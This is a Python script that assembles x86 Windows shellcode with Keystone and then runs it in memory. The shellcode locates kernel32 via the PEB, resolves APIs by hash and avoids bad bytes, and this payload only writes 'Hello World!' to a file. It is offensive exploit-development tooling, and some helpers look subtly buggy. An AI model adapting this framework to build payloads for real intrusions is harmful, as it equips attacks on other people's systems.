import argparse, ctypes, socket, struct, sys
from struct import pack
from keystone import *

#--------------------------------------------------------------------------------------------------------------------------
# Converters
#--------------------------------------------------------------------------------------------------------------------------
def ipByte(ip_string):
    packed_ip = socket.inet_aton(ip_string)
    ip_val = struct.unpack("<I", packed_ip)[0]
    checkBadIP(ip_val, ip_string)
    return f"0x{ip_val:08x}"

def portByte(port_string):
    port = int(port_string)
    packed_port = struct.pack('!H', port)
    hex_repr = packed_port[::-1].hex()
    checkBadPort(packed_port, port_string)
    return f"0x{hex_repr}"

#--------------------------------------------------------------------------------------------------------------------------
# Bad Character Detection
#--------------------------------------------------------------------------------------------------------------------------
def checkBadByteShellcode(shellcode):
    global BADCHARS
    found = []
    for i, b in enumerate(shellcode):
        if bytes([b]) in BADCHARS:
            found.append([i, b])
    
    if found:
        print("BADCHARS detected")
        for offset, byte in found:
            print("Bad Character in Offset %d: \\x%02X" % (offset, byte))
    else:
        print("[-]  0 bad characters: Proceed with Payload")

def checkBadIP(address, ip_string):
    global BADCHARS
    packed = pack("<L", address)  # pack the address into 4 bytes (little-endian)
    for b in packed:
        if bytes([b]) in BADCHARS:
            print(f"Bad Character: {hex(b)} in IP Address: {ip_string}. EXITING")
            sys.exit(1)
    return address

def checkBadPort(address, port_string):
    global BADCHARS
    found = []
    for i, b in enumerate(address):
        if bytes([b]) in BADCHARS:
            found.append([i, b])
    
        if found:
            print(f"Bad Character: {hex(b)} in Port: {port_string}. EXITING")
            sys.exit(1)
    return address

def checkBad(address):
    global BADCHARS
    packed = pack("<L", address)
    for b in packed:
        if bytes([b]) in BADCHARS:
            print(f"BAD CHARACTER DETECTED: {hex(b)} in {packed}")
            sys.exit(1)
    return address
#--------------------------------------------------------------------------------------------------------------------------
# String Buffer Scripts
#--------------------------------------------------------------------------------------------------------------------------
def packStrings(s: str):
    raw = s.encode("ascii")
    chunks = []
    i = 0
    while i + 4 <= len(raw):
        chunk = raw[i:i+4]
        val = int.from_bytes(chunk, "little")
        chunks.append(f"   mov eax, 0x{val:08x}; stosd;")
        i += 4

    leftover = raw[i:]
    for b in leftover:
        chunks.append(f"   mov al, 0x{b:02x}; stosb;")

    chunks.append("   xor al, al; stosb;")

    return "\n".join(chunks)

def packStringsAppend(s: str):
    raw = s.encode("ascii")
    chunks = []
    i = 0
    while i + 4 <= len(raw):
        chunk = raw[i:i+4]
        val = int.from_bytes(chunk, "little")
        chunks.append(f"   mov eax, 0x{val:08x}; stosd;")
        i += 4

    leftover = raw[i:]
    for b in leftover:
        chunks.append(f"   mov al, 0x{b:02x}; stosb;")

    return "\n".join(chunks)
    
#--------------------------------------------------------------------------------------------------------------------------
# API Hash Scripts
#--------------------------------------------------------------------------------------------------------------------------
def ror_str(byte, count):
    binb = format(byte & 0xFFFFFFFF, "032b")
    while count > 0:
        binb = binb[-1] + binb[:-1]
        count -= 1
    return int(binb, 2)

def checkBad32(address):
    global BADCHARS
    packed = pack(">L", address)
    pos = 0
    for b in packed:
        pos += 1
        if bytes([b]) in BADCHARS:
            print(f"Bad Byte: {hex(b)} in {hex(address)} at {pos}")
            return pos, address
        else:
            pass

    pos = 0
    return pos, address

def ComputeHash32(ApiString, position):
    esi = ApiString
    edx = 0x00
    ror_count = 0

    for eax in esi:
        edx = edx + ord(eax)
        if ror_count < len(esi)-1:
            edx = ror_str(edx, 0xd)
        ror_count += 1
    
    p, edx = checkBad32(edx)
    value = edx                 #0xDEADBEEF
    b0 = value & 0xFF           #0xEF
    b1 = (value >>  8) & 0xFF   #0xBE
    b2 = (value >> 16) & 0xFF   #0xAD
    b3 = (value >> 24) & 0xFF   #0xDE
    upper = edx >> 16           #0xDEAD
    lower = edx & 0xFFFF
    print(f"{ApiString} - {p}")

    if p == 1:
        chunks = []
        chunks.append(f"  xor eax, eax ;")        
        chunks.append(f"  add ah, {hex(b3-1)};")
        chunks.append(f"  add ah, 1;")
        chunks.append(f"  mov al, {hex(b2)};")
        chunks.append(f"  shl eax, 16 ;")
        chunks.append(f"  xor ecx, ecx ;")
        chunks.append(f"  mov cx, {hex(lower)} ;")
        chunks.append(f"  add eax, ecx ;")
        chunks.append(f"  push eax ;")
        chunks.append(f"  call dword ptr [ebp+0x04] ;")
        chunks.append(f"  mov dword ptr [ebp+{position}], eax ;")
        return "\n".join(chunks)
    
    if p == 2:
        chunks = []
        chunks.append(f"  xor eax, eax ;")
        chunks.append(f"  mov ax, {hex(lower)} ;")
        chunks.append(f"  xor ecx, ecx ;")
        chunks.append(f"  mov cx, {hex(upper+1)} ;")
        chunks.append(f"  sub cl, 0x01 ;")
        chunks.append(f"  shl ecx, 16 ;")
        chunks.append(f"  add eax, ecx ;")
        chunks.append(f"  push eax ;")
        chunks.append(f"  call dword ptr [ebp+0x04] ;")
        chunks.append(f"  mov dword ptr [ebp+{position}], eax ;")
        return "\n".join(chunks)
    
    if p == 3:
        chunks = []
        chunks.append(f"  xor eax, eax ;")        
        chunks.append(f"  add ah, {hex(b1 - 1)};")
        chunks.append(f"  add ah, 1;")
        chunks.append(f"  mov al, {hex(b0)};")
        chunks.append(f"  xor ecx, ecx ;")
        chunks.append(f"  mov cx, {hex(upper)} ;")
        chunks.append(f"  shl ecx, 16 ;")
        chunks.append(f"  add eax, ecx ;")
        chunks.append(f"  push eax ;")
        chunks.append(f"  call dword ptr [ebp+0x04] ;")
        chunks.append(f"  mov dword ptr [ebp+{position}], eax ;")
        return "\n".join(chunks)
    
    if p == 4:
        upper = edx >> 16
        lower = edx & 0xFFFF
        chunks = []
        chunks.append(f"  xor eax, eax ;")
        chunks.append(f"  mov ax, {hex(lower+1)} ;")
        chunks.append(f"  sub cl, 0x01 ;")
        chunks.append(f"  xor ecx, ecx ;")
        chunks.append(f"  mov cx, {hex(upper)} ;")
        chunks.append(f"  shl ecx, 16 ;")
        chunks.append(f"  add eax, ecx ;")
        chunks.append(f"  push eax ;")
        chunks.append(f"  call dword ptr [ebp+0x04] ;")
        chunks.append(f"  mov dword ptr [ebp+{position}], eax ;")
        return "\n".join(chunks)
    
    else:
        hash = hex(edx)
        chunks = []
        chunks.append(f"  push {hash} ;")
        chunks.append(f"  call dword ptr [ebp+0x10] ;")
        chunks.append(f"  mov dword ptr [ebp+{position}], eax ;")
        return "\n".join(chunks)

#--------------------------------------------------------------------------------------------------------------------------
# LoadLibraryA Scripts
#--------------------------------------------------------------------------------------------------------------------------
def PathToRegister32(path: str):
    out = []
    
    for i in range(0, len(path), 4):
        chunk = path[i:i+4]
        b = chunk.encode('ascii')
        b = b.ljust(4, b"\x00")
        val = int.from_bytes(b, 'little')
        if len(chunk) == 4:
            out.append((f"0x{val:08x}", chunk))
        elif len(chunk) == 3:
            out.append((f"0xAA{val:06x}  ", chunk))
        elif len(chunk) == 2:
            out.append((f"0x{val:04x}       ", chunk))
        elif len(chunk) == 1:
            out.append((f"0x{val:02x}           ", chunk))
    out.reverse()
    return out

def LoadLibrary32(path):
    code = []
    code.append(f"  xor eax, eax               ;")
    code.append(f"  push eax                   ;")

    for hexval, chunk in PathToRegister32(path):
        if len(chunk) == 4:
            code.append(f"  push {hexval}            ;")
        elif len(chunk) == 3:
            code.append(f"  push {hexval}            ;")
            code.append(f"  sub byte ptr [esp+3], 0xAA    ;")
        elif len(chunk) == 2:
            code.append(f"  mov ax, {hexval}      ;")
            code.append(f"  push eax                   ;")
        else:
            print("error: exiting")
            sys.exit(0)

    code.append(f"  push esp                   ;")
    code.append(f"  call dword ptr [ebp+0x14]  ;")
    code.append(f"  mov ebx, eax               ;")
    return "\n".join(code)

#--------------------------------------------------------------------------------------------------------------------------
# Shellcode
#--------------------------------------------------------------------------------------------------------------------------

global server, port, LHOST, LPORT, BADCHARS
BADCHARS = b"\x00"

CODE = (
" start:                             "  #
"   mov   ebp, esp                  ;"  #   insert int3 if debugging
"   lea esp, [esp-0x610]            ;"  #   Avoid NULL bytes

" find_kernel32:                     "  #
"   xor   ecx, ecx                  ;"  #   ECX = 0
"   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
"   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
"   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

" next_module:                       "  #
"   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
"   xor   edx, edx                  ;"  #   EDI = InInitOrder[X].module_name
"   add edx, 0x10                   ;"
"   add edx, 0x10                   ;"
"   mov edi, [esi+edx]              ;"
"   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
"   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00?
"   jne   next_module               ;"  #   No: try next module

" find_function_shorten:             "  #
"   jmp find_function_shorten_bnc   ;"  #   Short jump

" find_function_ret:                 "  #
"   pop esi                         ;"  #   POP the return address from the stack
"   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
"   jmp resolve_symbols_kernel32    ;"  #

" find_function_shorten_bnc:         "  #   
"   call find_function_ret          ;"  #   Relative CALL with negative offset

" find_function:                     "  #
"   pushad                          ;"  #   Save all registers
                                        #   Base address of kernel32 is in EBX from 
                                        #   Previous step (find_kernel32)
"   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
"   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
"   add   edi, ebx                  ;"  #   Export Table Directory VMA
"   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
"   lea   edx, [edi+0x18]           ;"  #   AddressOfNames RVA
"   add   edx, 0x08                 ;"
"   mov   eax, [edx]                ;"
"   add   eax, ebx                  ;"  #   AddressOfNames VMA
"   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

" find_function_loop:                "  #
"   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
"   dec   ecx                       ;"  #   Decrement our names counter
"   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
"   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
"   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

" compute_hash:                      "  #
"   xor   eax, eax                  ;"  #   NULL EAX
"   cdq                             ;"  #   NULL EDX
"   cld                             ;"  #   Clear direction

" compute_hash_again:                "  #
"   lodsb                           ;"  #   Load the next byte from esi into al
"   test  al, al                    ;"  #   Check for NULL terminator
"   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
"   rol   edx, 0x13                 ;"  #   Rotate edx 13 bits to the right ALT->ror edx, 0x0d
"   add   edx, eax                  ;"  #   Add the new byte to the accumulator
"   jmp   compute_hash_again        ;"  #   Next iteration

" compute_hash_finished:             "  #

" find_function_compare:             "  #
"   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
"   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
"   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
"   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
"   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
"   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
"   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
"   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
"   add   eax, ebx                  ;"  #   Get the function VMA
"   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

" find_function_finished:            "  #
"   popad                           ;"  #   Restore registers
"   ret                             ;"  #

" resolve_symbols_kernel32:          "
)

CODE += ComputeHash32("LoadLibraryA",                                 "0x10")
CODE += ComputeHash32("TerminateProcess",                             "0x14")
# File Creation
CODE += ComputeHash32("CreateFileA",                                  "0x20")
CODE += ComputeHash32("WriteFile",                                    "0x24")
CODE += ComputeHash32("CloseHandle",                                  "0x28")

# FileName [EBP-0x204]
CODE +=(
"   lea edi, [ebp-0x204]            ;")
CODE += packStrings("C:\\hello.txt")
CODE += (
"   xor edx, edx                    ;"
"   push edx                        ;"  #hTemplateFile
"   push edx                        ;"  #dwFlagsAndAttributes
"   push 0x3                        ;"  #dwCreationDisposition
"   xor edx, edx                    ;"  
"   push edx                        ;"  #lpSecurityAttributes  
"   push 0x1                        ;"  #dwShareMode
"   push 0x4                        ;"  #dwDesiredAccess
"   lea eax, [ebp-0x204]            ;"
"   push eax                        ;"  #lpFileName
"   call dword ptr [ebp+0x20]       ;"  #CreateFileA
"   mov dword ptr [ebp-0x260], eax  ;"  #Output:Handle [EBP-0x260]

#"Hello World" [EBP-0x240]
" write_text:                       "
"   lea edi, [ebp-0x240]            ;"
"   xor   ecx, ecx                  ;" 
"   xor   eax, eax                  ;"
"   mov   ax, 0x0A0C                ;"
"   mov   ecx, 0xFFFFFFFF           ;"
"   neg   ecx                       ;"
"   add   eax, ecx                  ;"
"   mov dword ptr [edi], eax        ;"
"   add edi, 2                      ;"
)
CODE += packStrings("Hello World!")
CODE += (
#WriteFile
"   xor edx, edx                    ;"
"   push edx                        ;" 
"   lea edi, [esp-4]                ;"  
"   push edi                        ;"
"   push 0x20                       ;"  
"   lea eax,  [ebp-0x240]           ;"
"   push eax                        ;"  
"   push dword ptr [ebp-0x260]      ;"  
"   call dword ptr [ebp+0x24]       ;"  #WriteFile
#CloseHandle
"   push dword ptr [ebp-0x260]      ;"  #
"   call dword ptr [ebp+0x28]       ;"  #CloseHandle


#   TerminateProcess
"   xor   ecx, ecx                  ;"
"   push  ecx                       ;"
"   push  0xffffffff                ;"
"   call dword ptr [ebp+0x14]       ;"  #   TerminateProcess
    
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("[-]  Generating %d instructions..." % count)
#print('\n')

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
#print(''.join('\\x%02X' % b for b in shellcode))
#print('\n')
checkBadByteShellcode(shellcode)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                            ctypes.c_int(len(shellcode)),
                                            ctypes.c_int(0x3000),
                                            ctypes.c_int(0x40))
                                            
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                        buf,
                                        ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s " % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.c_int(ptr),
                                            ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.pointer(ctypes.c_int(0)))
                                            
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
